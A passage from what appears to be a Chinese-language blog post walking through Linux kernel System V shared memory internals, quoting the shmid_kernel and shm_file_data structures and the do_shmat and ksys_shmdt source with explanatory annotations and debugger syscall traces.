class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>除了生成新的一个文件（这并不是真正的文件，而是 <strong>保存在内存上</strong> 的抽象文件，这也是 shm 和 mmap 根本上的不同点），<code>newseg</code> 还会在内核堆空间中创建一个重要的结构体</li>
<li>结构体 <code>shmid_kernel</code>，用于管理 <code>shmget</code> 生成的共享内存段：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shmid_kernel</span> /* <span class="title">private</span> <span class="title">to</span> <span class="title">the</span> <span class="title">kernel</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span>	<span class="title">shm_perm</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span>		*<span class="title">shm_file</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		shm_nattch;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		shm_segsz;</span><br><span class="line">	<span class="keyword">time64_t</span>		shm_atim;</span><br><span class="line">	<span class="keyword">time64_t</span>		shm_dtim;</span><br><span class="line">	<span class="keyword">time64_t</span>		shm_ctim;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span>		*<span class="title">shm_cprid</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span>		*<span class="title">shm_lprid</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span>	*<span class="title">mlock_user</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The task created the shm object.  NULL if the task is dead. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">shm_creator</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">shm_clist</span>;</span>	<span class="comment">/* list by creator */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>shmat</code> 和 <code>shmdt</code> 都依靠另一个重要的结构体 - <code>shm_file_data</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>映射共享内存的核心函数 <code>shmat</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee1199</span> &lt;shmat+<span class="number">9</span>&gt;        syscall  &lt;SYS_shmat&gt;</span><br><span class="line">       shmid: <span class="number">0x24</span></span><br><span class="line">       shmaddr: <span class="number">0x0</span></span><br><span class="line">       shmflg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>shmat</code> 底层会调用 <code>do_shmat</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">do_shmat</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">char</span> __user *shmaddr, <span class="keyword">int</span> shmflg,</span></span></span><br><span class="line"><span class="params"><span class="function">	      ulong *raddr, <span class="keyword">unsigned</span> <span class="keyword">long</span> shmlba)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">shmid_kernel</span> *<span class="title">shp</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shmaddr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>, *<span class="title">base</span>;</span></span><br><span class="line">	<span class="keyword">int</span>    err;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags = MAP_SHARED;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> prot;</span><br><span class="line">	<span class="keyword">int</span> acc_mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line">	<span class="keyword">int</span> f_flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> populate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	err = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (shmid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (addr) &#123; <span class="comment">/* shmaddr不为空(不常用) */</span></span><br><span class="line">		<span class="keyword">if</span> (addr &amp; (shmlba - <span class="number">1</span>)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (shmflg &amp; SHM_RND) &#123;</span><br><span class="line">				addr &amp;= ~(shmlba - <span class="number">1</span>);  <span class="comment">/* round down */</span></span><br><span class="line"></span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				 * Ensure that the round-down is non-nil</span></span><br><span class="line"><span class="comment">				 * when remapping. This can happen for</span></span><br><span class="line"><span class="comment">				 * cases when addr &lt; shmlba.</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				<span class="keyword">if</span> (!addr &amp;&amp; (shmflg &amp; SHM_REMAP))</span><br><span class="line">					<span class="keyword">goto</span> out;</span><br><span class="line">			&#125; <span class="keyword">else</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __ARCH_FORCE_SHMLBA</span></span><br><span class="line">				<span class="keyword">if</span> (addr &amp; ~PAGE_MASK)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">					<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		flags |= MAP_FIXED;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((shmflg &amp; SHM_REMAP)) </span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (shmflg &amp; SHM_RDONLY) &#123; <span class="comment">/* SHM_RDONLY:为只读模式 */</span></span><br><span class="line">		prot = PROT_READ;</span><br><span class="line">		acc_mode = S_IRUGO;</span><br><span class="line">		f_flags = O_RDONLY;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		prot = PROT_READ | PROT_WRITE;</span><br><span class="line">		acc_mode = S_IRUGO | S_IWUGO;</span><br><span class="line">		f_flags = O_RDWR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (shmflg &amp; SHM_EXEC) &#123; <span class="comment">/* SHM_EXEC:指定对共享内存段的执行权限 */</span></span><br><span class="line">		prot |= PROT_EXEC;</span><br><span class="line">		acc_mode |= S_IXUGO;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We cannot rely on the fs check since SYSV IPC does have an</span></span><br><span class="line"><span class="comment">	 * additional creator id...</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	shp = shm_obtain_object_check(ns, shmid); <span class="comment">/* 通过共享内存的shmid,在基数树中找到对应的struct shmid_kernel结构 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(shp)) &#123;</span><br><span class="line">		err = PTR_ERR(shp);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = -EACCES;</span><br><span class="line">	<span class="keyword">if</span> (ipcperms(ns, &amp;shp-&gt;shm_perm, acc_mode))</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">	err = security_shm_shmat(&amp;shp-&gt;shm_perm, shmaddr, shmflg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">	ipc_lock_object(&amp;shp-&gt;shm_perm);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* check if shm_destroy() is tearing down shp */</span></span><br><span class="line">	<span class="keyword">if</span> (!ipc_valid_object(&amp;shp-&gt;shm_perm)) &#123;</span><br><span class="line">		ipc_unlock_object(&amp;shp-&gt;shm_perm);</span><br><span class="line">		err = -EIDRM;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We need to take a reference to the real shm file to prevent the</span></span><br><span class="line"><span class="comment">	 * pointer from becoming stale in cases where the lifetime of the outer</span></span><br><span class="line"><span class="comment">	 * file extends beyond that of the shm segment.  It&#x27;s not usually</span></span><br><span class="line"><span class="comment">	 * possible, but it can happen during remap_file_pages() emulation as</span></span><br><span class="line"><span class="comment">	 * that unmaps the memory, then does -&gt;mmap() via file reference only.</span></span><br><span class="line"><span class="comment">	 * We&#x27;ll deny the -&gt;mmap() if the shm segment was since removed, but to</span></span><br><span class="line"><span class="comment">	 * detect shm ID reuse we need to compare the file pointers.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	base = get_file(shp-&gt;shm_file); <span class="comment">/* 找到shmem上的内存文件base */</span></span><br><span class="line">	shp-&gt;shm_nattch++;</span><br><span class="line">	size = i_size_read(file_inode(base)); <span class="comment">/* 获取shm_file的size */</span></span><br><span class="line">	ipc_unlock_object(&amp;shp-&gt;shm_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	err = -ENOMEM;</span><br><span class="line">	sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL); <span class="comment">/* 为shm_file_data分配内存 */</span></span><br><span class="line">	<span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">		fput(base);</span><br><span class="line">		<span class="keyword">goto</span> out_nattch;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	file = alloc_file_clone(base, f_flags,</span><br><span class="line">			  is_file_hugepages(base) ?</span><br><span class="line">				&amp;shm_file_operations_huge :</span><br><span class="line">				&amp;shm_file_operations); </span><br><span class="line">    <span class="comment">/* 拷贝一个struct file实例,同样将其private_data字段的值设置为inode-&gt;i_pipe的值 */</span></span><br><span class="line">	err = PTR_ERR(file);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(file)) &#123;</span><br><span class="line">		kfree(sfd);</span><br><span class="line">		fput(base);</span><br><span class="line">		<span class="keyword">goto</span> out_nattch;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sfd-&gt;id = shp-&gt;shm_perm.id;</span><br><span class="line">	sfd-&gt;ns = get_ipc_ns(ns);</span><br><span class="line">	sfd-&gt;file = base;</span><br><span class="line">	sfd-&gt;vm_ops = <span class="literal">NULL</span>;</span><br><span class="line">	file-&gt;private_data = sfd;</span><br><span class="line"></span><br><span class="line">	err = security_mmap_file(file, prot, flags);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_fput;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (down_write_killable(&amp;current-&gt;mm-&gt;mmap_sem)) &#123;</span><br><span class="line">		err = -EINTR;</span><br><span class="line">		<span class="keyword">goto</span> out_fput;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (addr &amp;&amp; !(shmflg &amp; SHM_REMAP)) &#123;</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (addr + size &lt; addr)</span><br><span class="line">			<span class="keyword">goto</span> invalid;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (find_vma_intersection(current-&gt;mm, addr, addr + size))</span><br><span class="line">			<span class="keyword">goto</span> invalid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addr = do_mmap_pgoff(file, addr, size, prot, flags, <span class="number">0</span>, &amp;populate, <span class="literal">NULL</span>); <span class="comment">/* 内存分配核心函数(在mmap的底层也会调用) */</span></span><br><span class="line">	*raddr = addr;</span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR_VALUE(addr))</span><br><span class="line">		err = (<span class="keyword">long</span>)addr;</span><br><span class="line">invalid:</span><br><span class="line">	up_write(&amp;current-&gt;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="keyword">if</span> (populate)</span><br><span class="line">		mm_populate(addr, populate);</span><br><span class="line"></span><br><span class="line">out_fput:</span><br><span class="line">	fput(file);</span><br><span class="line"></span><br><span class="line">out_nattch:</span><br><span class="line">	down_write(&amp;shm_ids(ns).rwsem);</span><br><span class="line">	shp = shm_lock(ns, shmid);</span><br><span class="line">	shp-&gt;shm_nattch--;</span><br><span class="line">	<span class="keyword">if</span> (shm_may_destroy(ns, shp))</span><br><span class="line">		shm_destroy(ns, shp);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		shm_unlock(shp);</span><br><span class="line">	up_write(&amp;shm_ids(ns).rwsem);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其实 <code>do_shmat</code> 底层申请内存的部分和 <code>mmap</code> 一样，至于 <code>do_mmap_pgoff</code> 已经在之前的博客中已经分析过了</li>
<li>PS：因为 <code>do_mmap_pgoff</code> 的底层还是调用了 <code>do_mmap</code>，所以可以通过 <code>do_munmap</code> 释放该内存，函数 <code>shmdt</code> 底层就是利用了这一点</li>
</ul>
<p>解除共享内存的核心函数 <code>shmdt</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ee11c9</span> &lt;shmdt+<span class="number">9</span>&gt;        syscall  &lt;SYS_shmdt&gt;</span><br><span class="line">       shmaddr: <span class="number">0x7ffff7ffb000</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>shmdt</code> 底层会调用 <code>ksys_shmdt</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_shmdt</span><span class="params">(<span class="keyword">char</span> __user *shmaddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shmaddr;</span><br><span class="line">	<span class="keyword">int</span> retval = -EINVAL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="keyword">loff_t</span> size = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (addr &amp; ~PAGE_MASK)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;mmap_sem))</span><br><span class="line">		<span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This function tries to be smart and unmap shm segments that</span></span><br><span class="line"><span class="comment">	 * were modified by partial mlock or munmap calls:</span></span><br><span class="line"><span class="comment">	 * - It first determines the size of the shm segment that should be</span></span><br><span class="line"><span class="comment">	 *   unmapped: It searches for a vma that is backed by shm and that</span></span><br><span class="line"><span class="comment">	 *   started at address shmaddr. It records it&#x27;s size and then unmaps</span></span><br><span class="line"><span class="comment">	 *   it.</span></span><br><span class="line"><span class="comment">	 * - Then it unmaps all shm vmas that started at shmaddr and that</span></span><br><span class="line"><span class="comment">	 *   are within the initially determined size and that are from the</span></span><br><span class="line"><span class="comment">	 *   same shm segment from which we determined the size.</span></span><br><span class="line"><span class="comment">	 * Errors from do_munmap are ignored: the function only fails if</span></span><br><span class="line"><span class="comment">	 * it&#x27;s called with invalid parameters or if it&#x27;s called to unmap</span></span><br><span class="line"><span class="comment">	 * a part of a vma. Both calls in this function are for full vmas,</span></span><br><span class="line"><span class="comment">	 * the parameters are directly copied from the vma itself and always</span></span><br><span class="line"><span class="comment">	 * valid - therefore do_munmap cannot fail. (famous last words?)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If it had been mremap()&#x27;d, the starting address would not</span></span><br><span class="line"><span class="comment">	 * match the usual checks anyway. So assume all vma&#x27;s are</span></span><br><span class="line"><span class="comment">	 * above the starting address given.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	vma = find_vma(mm, addr); <span class="comment">/* 根据一个属于某个进程的虚拟地址,找到其所属的进程虚拟区间,并返回相应的vma_area_struct结构体指针 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="keyword">while</span> (vma) &#123;</span><br><span class="line">		next = vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Check if the starting address would match, i.e. it&#x27;s</span></span><br><span class="line"><span class="comment">		 * a fragment created by mprotect() and/or munmap(), or it</span></span><br><span class="line"><span class="comment">		 * otherwise it starts at this address with no hassles.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ((vma-&gt;vm_ops == &amp;shm_vm_ops) &amp;&amp;</span><br><span class="line">			(vma-&gt;vm_start - addr)/PAGE_SIZE == vma-&gt;vm_pgoff) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Record the file of the shm segment being</span></span><br><span class="line"><span class="comment">			 * unmapped.  With mremap(), someone could place</span></span><br><span class="line"><span class="comment">			 * page from another segment but with equal offsets</span></span><br><span class="line"><span class="comment">			 * in the range we are unmapping.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			file = vma-&gt;vm_file;</span><br><span class="line">			size = i_size_read(file_inode(vma-&gt;vm_file));</span><br><span class="line">			do_munmap(mm, vma-&gt;vm_start, vma-&gt;vm_end - vma-&gt;vm_start, <span class="literal">NULL</span>); <span class="comment">/* 释放调用do_mmap生成的内存空间 */</span></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * We discovered the size of the shm segment, so</span></span><br><span class="line"><span class="comment">			 * break out of here and fall through to the next</span></span><br><span class="line"><span class="comment">			 * loop that uses the size information to stop</span></span><br><span class="line"><span class="comment">			 * searching for matching vma&#x27;s.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			retval = <span class="number">0</span>;</span><br><span class="line">			vma = next;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		vma = next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We need look no further than the maximum address a fragment</span></span><br><span class="line"><span class="comment">	 * could possibly have landed at. Also cast things to loff_t to</span></span><br><span class="line"><span class="comment">	 * prevent overflows and make comparisons vs. equal-width types.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = PAGE_ALIGN(size);</span><br><span class="line">	<span class="keyword">while</span> (vma &amp;&amp; (<span class="keyword">loff_t</span>)(vma-&gt;vm_end - addr) &lt;= size) &#123;</span><br><span class="line">		next = vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* finding a matching vma now does not alter retval */</span></span><br><span class="line">		<span class="keyword">if</span> ((vma-&gt;vm_ops == &amp;shm_vm_ops) &amp;&amp;</span><br><span class="line">		    ((vma-&gt;vm_start - addr)/PAGE_SIZE == vma-&gt;vm_pgoff) &amp;&amp;</span><br><span class="line">		    (vma-&gt;vm_file == file))</span><br><span class="line">			do_munmap(mm, vma-&gt;vm_start, vma-&gt;vm_end - vma-&gt;vm_start, <span class="literal">NULL</span>); <span class="comment">/* 释放调用do_mmap生成的内存空间 */</span></span><br><span class="line">		vma = next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>	<span class="comment">/* CONFIG_MMU */</span></span></span><br><span class="line">	<span class="comment">/* under NOMMU conditions, the exact address to be destroyed must be</span></span><br><span class="line"><span class="comment">	 * given</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (vma &amp;&amp; vma-&gt;vm_start == addr &amp;&amp; vma-&gt;vm_ops == &amp;shm_vm_ops) &#123;</span><br><span class="line">		do_munmap(mm, vma-&gt;vm_start, vma-&gt;vm_end - vma-&gt;vm_start, <span class="literal">NULL</span>); <span class="comment">/* 释放调用do_mmap生成的内存空间 */</span></span><br><span class="line">		retval = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	up_write(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>内核开发人员已经把遍历释放的过程写好注释了，这些操作要么为了安全，要么为了效率</li>
</ul>
